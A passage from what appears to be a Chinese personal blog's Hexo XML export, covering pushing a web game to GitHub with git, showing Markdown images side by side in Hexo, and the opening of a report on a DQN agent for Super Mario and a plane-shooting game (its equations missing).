<img src="https://img-blog.csdnimg.cn/20201212232314167.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">可以看到git创建了一个.git文件</li>
<li><p>git add .</p>
<pre class="line-numbers language-none"><code class="language-none">git add .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201212232615556.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
</li>
<li><p>git commit -m “first commit”</p>
<pre class="line-numbers language-none"><code class="language-none">git commit -m &quot;first commit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/20201212232746366.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<ol>
<li>git remote add origin <a href="https://github.com/mmrslwan1110/Clock.git">https://github.com/mmrslwan1110/Clock.git</a><pre class="line-numbers language-none"><code class="language-none">
git remote add origin https:&#x2F;&#x2F;github.com&#x2F;mmrslwan1110&#x2F;Clock.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212233029800.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
</ol>
<p>记得换成自己的链接哦</p>
<ol>
<li>git push -u origin master<pre class="line-numbers language-none"><code class="language-none">git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<img src="https://img-blog.csdnimg.cn/20201212233354499.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">已经发布到自己的网站了可以访问看看自己的网站测一下效果哦。</li>
</ol>
<h2 id="发现由于我替换的资源是白底的导致游戏很奇怪"><a href="#发现由于我替换的资源是白底的导致游戏很奇怪" class="headerlink" title="发现由于我替换的资源是白底的导致游戏很奇怪"></a>发现由于我替换的资源是白底的导致游戏很奇怪</h2><p> 该问题有两种解决方法</p>
<ul>
<li>1.修改图片，想办法将图片的底层白底删除成为空白</li>
<li>2.修改背景，将背景变为白色。<h3 id="为了偷懒先采用方法2改背景"><a href="#为了偷懒先采用方法2改背景" class="headerlink" title="为了偷懒先采用方法2改背景"></a>为了偷懒先采用方法2改背景</h3>先用F12开发者模式找到背景所在的位置<br><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/CS4LXVGR7B5BT322.png" alt=""><br>将图片修改为白色，接下来就很简单了，测试<br><a href="http://www.mmrsl.cn/wp-content/uploads/2021/01/wp_editor_md_7c98485a44cce7e35a943f7808afeebe.jpg"><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/wp_editor_md_7c98485a44cce7e35a943f7808afeebe.jpg" alt=""></a><br>测试发现还是会有突兀的白色边框出现，接下来咱们只能修改每张素材的背景颜色了。<h3 id="采用方法1修改图片背景"><a href="#采用方法1修改图片背景" class="headerlink" title="采用方法1修改图片背景"></a>采用方法1修改图片背景</h3>通过PS对每张图片进行修改，将所有图片的背景白色底全部去掉，然后就恢复到了这样。<br><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/E45185267C0E492E2A061A6C3E7E9DF7.jpg" alt=""><br>接下来将之前的底复原，即可得到结果，最终版本如下<br><img src="http://www.mmrsl.cn/wp-content/uploads/2021/01/BD7F4999E4F669692729B18BB026DC2B.jpg" alt=""></li>
</ul>
<h2 id="合成大西瓜游戏运行"><a href="#合成大西瓜游戏运行" class="headerlink" title="合成大西瓜游戏运行"></a>合成大西瓜游戏运行</h2><p>体验网址为：<a href="https://www.codekp.cn/HCXMU/index.html" title="合成厦大">合成厦大</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>合成大西瓜</tag>
        <tag>厦门大学</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo、markdown图片并行显示</title>
    <url>/2020/11/28/%E5%9B%BE%E7%89%87%E5%B9%B6%E8%A1%8C%E6%98%BE%E7%A4%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hexo、markdown图片并行显示"><a href="#hexo、markdown图片并行显示" class="headerlink" title="hexo、markdown图片并行显示"></a><center>hexo、markdown图片并行显示</center></h1><h2 id="1-markdown图片显示方法"><a href="#1-markdown图片显示方法" class="headerlink" title="1.markdown图片显示方法"></a>1.markdown图片显示方法</h2><h3 id="1-1-Alt-text"><a href="#1-1-Alt-text" class="headerlink" title="1.1 Alt text"></a>1.1 <a href="">Alt text</a></h3><pre class="line-numbers language-none"><code class="language-none">![Alt text](https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190811133756709.png &quot;optional title&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>效果：<br><img src="https://img-blog.csdnimg.cn/20190811133756709.png" alt="Alt text" title="optional title"></p>
<p>Alt text：图片的Alt标签，用来描述图片的关键词，可以不写。最初的本意是当图片因为某种原因不能被显示时而出现的替代文字，后来又被用于SEO，可以方便搜索引擎根据Alt text里面的关键词搜索到图片。 图片链接：可以是图片的本地地址或者是网址。”optional title”：鼠标悬置于图片上会出现的标题文字，可以不写。</p>
<h3 id="1-2-插入本地图片-avatar"><a href="#1-2-插入本地图片-avatar" class="headerlink" title="1.2 插入本地图片 ![avatar]"></a>1.2 插入本地图片 ![avatar]</h3><p>只需要在基础语法的括号中填入图片的位置路径即可，支持绝对路径和相对路径。<br>例如：<br><pre class="line-numbers language-none"><code class="language-none">![avatar](&#x2F;home&#x2F;picture&#x2F;1.png)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>不灵活不好分享，本地图片的路径更改或丢失都会造成markdown文件调不出图。</p>
<p>只需要在基础语法的括号中填入图片的网络链接即可，现在已经有很多免费/收费图床和方便传图的小工具可选。</p>
<p>效果：<br><img src="https://img-blog.csdnimg.cn/20190811133756709.png" alt="avatar"></p>
<h3 id="1-3-控制图片大小的插入网络图片"><a href="#1-3-控制图片大小的插入网络图片" class="headerlink" title="1.3 控制图片大小的插入网络图片"></a>1.3 控制图片大小的插入网络图片</h3><pre class="line-numbers language-none"><code class="language-none">&lt;center&gt;
&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190811133756709.png&quot; width &#x3D; &quot;400&quot; height &#x3D; &quot;302&quot; alt&#x3D;&quot;图片名称&quot; align&#x3D;center &#x2F;&gt;
&lt;&#x2F;center&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>效果如下所示：</p>
<center>
<img src="https://img-blog.csdnimg.cn/20190811133756709.png" width = "400" height = "302" alt="图片名称" align=center />
</center>

<h2 id="2-markdown图片并行显示"><a href="#2-markdown图片并行显示" class="headerlink" title="2.markdown图片并行显示"></a>2.markdown图片并行显示</h2><p>以上两种方法无法将图片并行显示：<br>于是尝试如下方法：但均无法满足需求</p>
<h3 id="2-1-方法1"><a href="#2-1-方法1" class="headerlink" title="2.1 方法1"></a>2.1 方法1</h3><pre class="line-numbers language-none"><code class="language-none">&lt;center class&#x3D;&quot;half&quot;&gt;
    &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190811133756709.png&quot; width&#x3D;&quot;100&quot;&#x2F;&gt; &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190811133756709.png&quot; width&#x3D;&quot;100&quot;&#x2F;&gt;  &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdnimg.cn&#x2F;20190811133756709.png&quot; width&#x3D;&quot;100&quot;&#x2F;&gt;
&lt;&#x2F;center&gt;
&lt;center class&#x3D;&quot;half&quot;&gt;
    &lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;2018061215200776?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxODA4OTYx&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70&quot; width&#x3D;&quot;200&quot;&#x2F;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180612152032532?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxODA4OTYx&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70&quot; width&#x3D;&quot;200&quot;&#x2F;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180612152100203?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxODA4OTYx&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70&quot; width&#x3D;&quot;200&quot;&#x2F;&gt;
&lt;&#x2F;center&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：</p>
<p><center class="half">
    <img src="https://img-blog.csdnimg.cn/20190811133756709.png" width="100"/> <img src="https://img-blog.csdnimg.cn/20190811133756709.png" width="100"/>  <img src="https://img-blog.csdnimg.cn/20190811133756709.png" width="100"/>
</center></p>
<p><center class="half">
    <img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" width="200"/><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" width="200"/><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" width="200"/>
</center><br>该方法在markdown中显示为并行但是hexo页面中却不能满足需求。</p>
<h3 id="2-2-方法2"><a href="#2-2-方法2" class="headerlink" title="2.2 方法2"></a>2.2 方法2</h3><pre class="line-numbers language-none"><code class="language-none">&lt;center&gt;
&lt;figure&gt;
&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot; &#x2F;&gt;
&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot; &#x2F;&gt;
&lt;&#x2F;figure&gt;
&lt;&#x2F;center&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>效果：</p>
<p><center></p>
<p><figure>
<img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" />
<img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" />
</figure><br>&lt;/center&gt;<br>该方法也不满足要求</p>
<h3 id="2-2-方法3"><a href="#2-2-方法3" class="headerlink" title="2.2 方法3"></a>2.2 方法3</h3><pre class="line-numbers language-none"><code class="language-none">&lt;div style&#x3D;&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot;  width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot; &gt;&lt;&#x2F;div&gt;
&lt;div style&#x3D;&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot;  width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot; &gt;&lt;&#x2F;div&gt;
&lt;div style&#x3D;&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot; width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot; &gt;&lt;&#x2F;div&gt;
&lt;div style&#x3D;&quot;float:left;border:solid 1px 000;margin:2px;&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;img2018.cnblogs.com&#x2F;blog&#x2F;1735896&#x2F;202001&#x2F;1735896-20200116162140471-237299356.png&quot; width&#x3D;&quot;200&quot; height&#x3D;&quot;200&quot; &gt;&lt;&#x2F;div&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<div style="float:left;border:solid 1px 000;margin:2px;"><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png"  width="200" height="200" ></div>
<div style="float:left;border:solid 1px 000;margin:2px;"><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png"  width="200" height="200" ></div>
<div style="float:left;border:solid 1px 000;margin:2px;"><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" width="200" height="200" ></div>
<div style="float:left;border:solid 1px 000;margin:2px;"><img src="https://img2018.cnblogs.com/blog/1735896/202001/1735896-20200116162140471-237299356.png" width="200" height="200" ></div>

<div style="float:none;clear:both;">

</div>
该方法满足需求
但是没有空行，需要在最后加入一行

<pre class="line-numbers language-none"><code class="language-none">&lt;div style&#x3D;&quot;float:none;clear:both;&quot;&gt;

&lt;&#x2F;div&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<div style="float:none;clear:both;">

</div>]]></content>
      <categories>
        <category>辅助技术</category>
      </categories>
      <tags>
        <tag>markdown</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>基于深度强化学习的超级马里奥和飞机大战自动控制</title>
    <url>/2021/03/15/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%9A%84%E8%B6%85%E7%BA%A7%E9%A9%AC%E9%87%8C%E5%A5%A5%E5%92%8C%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E8%87%AA%E5%8A%A8%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="基于深度强化学习的超级马里奥和飞机大战自动控制"><a href="#基于深度强化学习的超级马里奥和飞机大战自动控制" class="headerlink" title="基于深度强化学习的超级马里奥和飞机大战自动控制"></a><center>基于深度强化学习的超级马里奥和飞机大战自动控制</center></h1><span id="more"></span>
<p><strong>摘 要</strong>：2012年深度神经网络模型的成功构建，解决了传统强化学习的诸多不足，使得直接从原始数据中自适应地提取精确的高层次特征成为可能，学者们开始着手研究于深度学习在强化学习中的应用。而为了测试结合深度学习模型和强化学习模型在不同的游戏中的表现，本文通过开发一个卷积神经网络模型，应用强化学习设计了两个专门的智能体分别来完成《超级马里奥兄弟》和《飞机大战》这两款游戏。该模型通过基于游戏画面场景的状态分析完成了图像的识别分类，从游戏画面帧的原始像素数据中学习控制策略，并训练模型使之在输入未知和多维数据时选择正确的操作，其本质上是一个对游戏场景中特定状态的模式识别过程。这种方式可以进行学习，且算法可以学会自动对图像进行特征提取，对于训练中未出现的场景和状态也同样可以进行分类和预测。本文中通过将博弈环境抽象为状态向量，并使用DQN算法来处理复杂的游戏环境，实现了以上两款游戏的自动控制。</p>
<p><strong>关键词</strong>：强化学习；强化学习；游戏；自动控制</p>
<h2 id="引-言"><a href="#引-言" class="headerlink" title="引 言"></a>引 言</h2><p>深层卷积神经网络其上含有的卷积核可通过和前层平面的每个小邻域相卷积来探测具有代表性的图像特征。在应用强化学习实现游戏的自动智能体的过程中，我们的研究目标是利用图像中的不同对象训练卷积神经网络，构建一个强化学习的控制器智能体，它可以学习游戏环境并且通过将整个环境抽象描述为几个离散的键值属性来表示状态[1]，使用Q-Learning算法作为以最大化奖励为目标的决策策略，从而使之在输入未知和多维数据时选择正确的操作。</p>
<p>值的注意的是，计算机在训练过程中所获得的信息与人类玩家完全一致，其仅包括游戏的每一帧图像、小鸟的动作列表(跳跃、无操作)、计算机做出动作之后的奖励、游戏是否结束的标志等。使用强化学习的难点在于如何定义状态、行动、奖励和解决时滞问题，并且当智能体获得奖励时，我们必须确定究竟是哪一动作在获得奖励中发挥了作用以及其作用发挥的权重。</p>
<p>本报告的其余部分组织如下:在论文的第2部分我们主要简要概述了游戏的AI界面和Q-Learning算法；在第3部分中解释了在实验中我们是如何定义状态、行动、奖励在强化学习中使用并对实验结果进行了展示与分析。</p>
<p><strong>1 绪论</strong></p>
<h3 id="1-1研究动机与目的"><a href="#1-1研究动机与目的" class="headerlink" title="1.1研究动机与目的"></a><strong>1.1研究动机与目的</strong></h3><p>应用强化学习实现游戏的自动智能体的思路一经提出便受到了广大学者们的关注和讨论，相较于人类玩家的游戏模式，计算机自主进行游戏的模式可以得到有价值的观察，这对于作为游戏设计师而言，可以更好地理解游戏参数和玩家体验之间的关系，提供更多更有效的改进算法的思路，通过调整的游戏参数去探索游戏空间从而调整游戏难度以获得理想的玩家体验，并且还可助力于之后的游戏开发。此外，它还能带动无人驾驶、机器人导航和物体追踪等同类领域的研究工作。</p>
<h3 id="1-2-研究背景及意义"><a href="#1-2-研究背景及意义" class="headerlink" title="1.2 研究背景及意义"></a><strong>1.2 研究背景及意义</strong></h3><h4 id="1-2-1深度学习与强化学习背景"><a href="#1-2-1深度学习与强化学习背景" class="headerlink" title="1.2.1深度学习与强化学习背景"></a><strong>1.2.1深度学习与强化学习背景</strong></h4><p>2006年机器学习界的泰斗发表的«A fast learning algorithm for deep belief<br>nets»[2],文章中主要阐述的观点有：</p>
<p>在网络中包含多个隐藏层，其通过一定的训练方法后可以得到更优越的特征表达式，这些特征能更清晰地描述原始数据的本质特征，有利于将特征可视化或者任务分类。</p>
<p>可以使用逐层初始化（layer-wise<br>pre-training）的方法来解决传统神经网络训练中的难题。该方法是通过无监督特征学习[3,4,5,6]（Unsupervised<br>Feature Learning）来实现的。</p>
<p>2012年Google Brain<br>项目引起了广泛关注，其使用大规模并行计算平台进行算法部署和模型训练，构建了一个“深度学习的网络”（DNN，Deep<br>Neural<br>Networks）的模型[7]。由此之后深度学习给诸多领域都带来了新的发展，其中包括语音识别、图像处理等众多领域。</p>
<p>随着深度学习在各个领域的重大发展，使得其为强化学习领域的发展带来可能。传统强化学习[2]主要依赖于组合人工特征和线性价值函数或策略表达来实现，但是，系统的性能很大程度依赖于所提取的特征提取的效果，同时，人工提取特征存在只对特定任务有效的特性，且难度较大，耗费时间较长等特性。深度学习的发展使得直接从原始数据中自适应地提取精确的高层次特征成为可能。将深度学习应用于强化学习开始进入人们的视野。本文通过研究有趣的游戏来测试结合深度学习模型和强化学习模型在不同的游戏中的表现，对强化学习的算法进行分析。同时我们相信这项技术将可以应用到更多的领域。</p>
<h4 id="1-2-2-游戏"><a href="#1-2-2-游戏" class="headerlink" title="1.2.2 游戏"></a><strong>1.2.2 游戏</strong></h4><p>本文尝试将将深度学习应用到游戏中去。首先分析视频游戏中的步骤：</p>
<p>玩家点击开始按键，游戏场景开始切换，玩家对出现的画面进行信号的处理。</p>
<p>大脑将视觉信号转换为语义信息，其中包括物体的类别，不同物体所在的位置信息。其后玩家根据大脑反馈的信息选择接下来的具体操作。并通过按键将此决策传递到游戏内部。</p>
<p>游戏接收指令并处理完成后，场景切换到下一帧，玩家可能会因此得到相应的奖励或惩罚。如此循环，直到游戏结束。</p>
<p>由分析可得出此视频游戏的流程图，分为玩家无法干涉的环境部分和玩家控制的游戏部分。接下来使用agent模拟人类玩家，即让agent去代替人来玩家执行以上玩家执行的操作。Agent通过与人类玩家的对比得出需进行以下操作：</p>
<p>接收游戏场景信号和回复信号，对收到的信号进行处理，如特征提取等。进而识别位置信息等。</p>
<p>根据历史信息及经验，对当前的游戏场景进性分析后作出相应的游戏操作。</p>
<p>将采取的相应游戏操作通过按键传递给游戏模拟器。</p>
<p>我们希望agent可以像人类一样通过不断的更新经验值来使游戏玩的越来越好，将DL强大的特征提取能力和RL的环境学习能力结合的深度强化学习模型（Deep<br>Reinforcement Learning, DRL）[8].</p>
<h3 id="1-3研究现状"><a href="#1-3研究现状" class="headerlink" title="1.3研究现状"></a><strong>1.3研究现状</strong></h3><p>应用强化学习(RL)[9]玩游戏一直是当今AI的研究热点，它可以通过场景训练模拟玩家行为从而实现智能体。在此研究领域，Mnih等人于2013年提出了结合深层神经网络的强化学习的DQN（Deep<br>Q-Network）模型[10]，并成功训练出相应的智能体使之可自主完成2600种Atari游戏，并且在多个游戏[11][12]上达到了超越人类的专家级水平，受其启发，我们在这两款游戏中，很大程度地模仿了前人的方法，以深层神经网络作为近似函数代表Q-Learning中的Q值（动作值），并通过使用以前经验的“经验回放”从中随机抽取部分经验来更新网络，以便将模型得到的经验和延迟更新联系起来，从而获得目标值以提高稳定性。</p>
<p><strong>2</strong> 算法设计</p>
<h3 id="2-1-Q-Learning"><a href="#2-1-Q-Learning" class="headerlink" title="2.1 Q-Learning"></a><strong>2.1 Q-Learning</strong></h3><p>由于智能体只在任何一个时间步长观察当前帧，即其只能对任务进行局部观察，这意味着当前屏幕的信息不足以理解智能体的整个游戏环境。所以我们考虑一系列的行为和状态，并从中学习策略。我们假设环境中的所有序列都可在有限的时间步长内终止，从而将游戏建模为一个有限马尔可夫决策过程[13]。此时状态之间的具体转换概率是未知的，因此我们无法采用常规的强化学习进行迭代，而Q-Learning算法却可以在不使用状态转移概率的情况下收敛，符合我们的需要。这也是我们选择Q-Learning算法的缘由所在。</p>
<p>在Q-Learning算法中，我们将学习环境视为一个状态机，通过值迭代来寻找最优策略，从而使总回报（奖励）最大化，对于表中的每一对状态、动作，它维护一个由Q表示的期望总回报(即时+未来)的值。对于特定状态下的每一个动作，都会给予奖励，Q值总是使用贝尔曼方程进行迭代更新：</p>
<p>（2-1）</p>
<p>但在实际处理过程中，我们并不直接使用估计Q值来更新Q值，而是通过梯度下降的逐步逼近的做法，使其收敛到最优的Q值，转移规则如下：</p>
<p>（2-2）</p>
<p>在Q-Learning算法中，其输入点由四项组成，分别代表四个主要因素:当前状态、选择动作、奖励和未来状态，函数通过其输入点来构建一个整体回报最大且可据此预测未来动作的模型[14]。</p>
<p>式(2-2)表示对于每个当前状态，我们将Q值更新为当前值、当前奖励和最大可能未来值的组合。其中为影响学习收敛的速度的学习因子，为权衡长短期回报间折扣因子，它表示在优化过程中有多少未来状态被考虑在内，为当前状态的Q值,为未来状态的Q值，r为奖励，表示根据当前的Q表，在状态执行动作转移到状态后得到的真实的Q值。其原理图如下：</p>
<p><img src="https://www.mmrsl.cn/download/img/media/43d961dc8df137f0dc134a12a07cdbb7.png" alt=""></p>
<p>图1 Q-learning原理图</p>
<p>实际上，在训练智能体时，我们使用的是贪婪的Q-Learning算法，该算法是Q-Learning的一个小变体，它根据概率随机选择每一步的行动或根据概率为的Q表，选择最佳行动。执行该操作后，Q表更新为1。</p>
<h3 id="2-2-Deep-Q-Networks"><a href="#2-2-Deep-Q-Networks" class="headerlink" title="2.2 Deep Q Networks"></a><strong>2.2 Deep Q Networks</strong></h3><p>由于Q-Learning的核心是R表与Q表，其行表示状态，列表示动作，因此，若我们使用Q-Learning进行迭代来更新值的过程中，需要读取和维护整个状态表，才能计算出未来期望状态值，而无论是维护还是读取，其代价都是比较大的。</p>
<p>而我们知道，神经网络天生比较适合用来表示十分复杂的形式，所以用神经网络来维护Q表是比较合适的方式。DQN就是Q-Learning神经网络的结果，其属于一种多层卷积神经网络，其输出为一个给定状态和网络参数的动作值向量，是一个从Rn到Rm的函数，其n和m分别表示是状态空间与动作空间的维数[6]。因此，在DQN中，只需输入一个状态，神经网络即可直接生成Q值，其有着比Q-Learning快得多的更新速度，由此，我们通常用DQN来处理状态更加复杂的问题。</p>
<p>由于在Q-Learning中，连续存储的经验数据具有高度相关性。而由于样本之间的强相关性，若直接以相同的顺序在连续样本中完成DQN参数的更新显然是十分低效的。因此，我们想到：是否可通过随机化样本的方式来破坏样本的连续性从而降低其相关性，以达到减少更新的方差的目的。为此我们设置了一个经验回放存储器用于保存马里奥或我方战机过去所有的经历，采用“经验回放存储器+随机采样”的方式来破坏样本的连续性并用于进行DQN参数上的梯度下降，设置其DQN参数会在固定的时间间隔内进行更新，由于小批量选择结果具有随机性，所得的用于更新DQN参数的数据是去相关的，因此，此时得到的训练结果更加有效。经验回放解决了之前提到的奖励通常具有时滞性的问题。</p>
<p>而我们使用神经网络来预测动作，就必须了解训练神经网络的权重，但不同于输出层只有一个神经元的分类问题，此时的DQN输出层中有多个神经元来分别对应多个动作，因此，就无法直接采用交叉熵函数作为损失函数，针对这种情况，我们采用两个结构一致参数不同的DQN网络：Q_net与Q_netT，每隔若干个时间步训练之后，就将Q_net的参数赋予Q_netT，并使用一组参数<br>来参数化逼近值函数，这种参数化逼近的方式使得在更新的同时，同步完成整体更新，不仅避免了过拟合情况，还使得模型的泛化能力更强。DQN模型的总体结构示意图如下：</p>
<p><img src="https://www.mmrsl.cn/download/img/media/4c6aa4a335d8593e27bb56d1e643195d.png" alt=""></p>
<p>图2 DQN模型的总体结构示意图</p>
<p>在研究Q-Learning 的损失函数之前，我们首先确立Q-Learning<br>的优化目标——使得最小，见式（2-3）：</p>
<p>(2-3)</p>
<p>若将TD目标作为标签，将作为模型的输出y，在加入参数θ后，原优化目标转化为式（2-4）：</p>
<p>(2-4)</p>
<p>由此问题就转化为我们所熟悉的监督学习中的回归问题，显然我们所要确定的损失函数就是其均方误差，因此可用梯度下降算法最小化损失，从而更新参数θ，得到的损失函数的梯度下降公式如式（2-5）所示：</p>
<p>(2-5)</p>
<p>但此TD目标是标签，所以中的是无法更新的，这种方法只有部分梯度，称为半梯度法。而后，DeepMind在Nature-2015版本中将TD</p>
<p>网络单独分开，通过每隔固定步数将值函数逼近的网络参数拷贝给其本身的参数，由此保证DQN的训练更加稳定，式（2-6）即为含有目标网络参数的梯度下降公式：</p>
<p>(2-6)</p>
<p>此外，我们一般将奖励固定在某个阈值上，避免Q值过大的情况发生同时确保梯度是有条件的。</p>
<p>DQN算法和Q-Learning的区别是用CNN（深度卷积神经网络）代替Q矩阵。其Q矩阵的更新公式为：</p>
<p>（2-7）</p>
<p>CNN根据SGD（随机梯度下降算法）选取下一步的动作，以类似的方式给出损失函数：</p>
<p>（2-8）</p>
<p><strong>3 系统模型</strong></p>
<h3 id="3-1游戏系统模型"><a href="#3-1游戏系统模型" class="headerlink" title="3.1游戏系统模型"></a><strong>3.1游戏系统模型</strong></h3><p>对于游戏而言，存在环境、游戏角色和玩家所构成的一个游戏系统，玩家可以通过键盘或手柄控制角色的运动，在环境中获得最大的一个收益。而本文则采用强化学习算法选择下一时隙的动作在环境中获得一个最大收益。为简化模型本文仅考虑游戏中的三个部分：角色、环境和智能体，拓扑结构如下图所示：</p>
<p><img src="https://www.mmrsl.cn/download/img/media/343c055c95493d3cb90466bbe2efc778.png" alt=""></p>
<p>图3 游戏系统拓扑图</p>
<p>智能体选择动作，游戏角色执行智能体选择的动作，环境进行反馈，角色在该动作下的动作、。游戏图像、角色所处位置和游戏角色在该动作下的回报，游戏系统的控制模型如下图所示。</p>
<p><img src="https://www.mmrsl.cn/download/img/media/624796c3a764a7a780abb1cea6301d16.png" alt=""></p>
<p>图4 游戏系统控制模型</p>
<p>智能体通过强化学习算法，做出决策选择合适的动作，环境做出反馈后获得游戏的收益。本游戏系统中所用的参数设置如下表所示：</p>
<p>表1 系统参数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>当前动作</td>
</tr>
<tr>
<td></td>
<td>图像数据</td>
</tr>
<tr>
<td></td>
<td>游戏角色所处位置</td>
</tr>
<tr>
<td></td>
<td>游戏角色在当前动作下的奖励</td>
</tr>
</tbody>
</table>
</div>
<h3 id="3-2-智能体的算法设置"><a href="#3-2-智能体的算法设置" class="headerlink" title="3.2 智能体的算法设置"></a><strong>3.2 智能体的算法设置</strong></h3><p>本文采用强化学习算法，通过Q矩阵或CNN(卷积神经网络)进行决策，根据当前状态选择下一时刻的动作。致力于让游戏中的角色选择最好的动作，获得最大的效益。</p>
